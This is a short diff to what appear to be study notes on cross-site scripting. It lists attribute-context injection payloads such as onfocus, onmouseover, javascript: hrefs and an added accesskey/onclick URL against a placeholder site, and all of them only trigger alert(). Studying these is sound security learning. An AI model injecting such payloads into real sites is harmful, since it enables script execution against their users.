@@ -25,4 +25,6 @@ in [[cause & sinks#DOM-based|this]] case
 	- **same tag** -> **new attribute** ->
 	   `" autofocus onfocus=alert(document.domain) x="` (`x="` to gracefully repair the following markup)
 	  `"onmouseover="alert(1)`
-	- **same tag** -> **same attribute** -> `<a href="javascript:alert(document.domain)">`
+	- **same tag** -> **same attribute** 
+	  -  `<a href="javascript:alert(document.domain)">`
+	  - `https://vulnerable-website.com/?'accesskey='x'onclick='alert(1)`
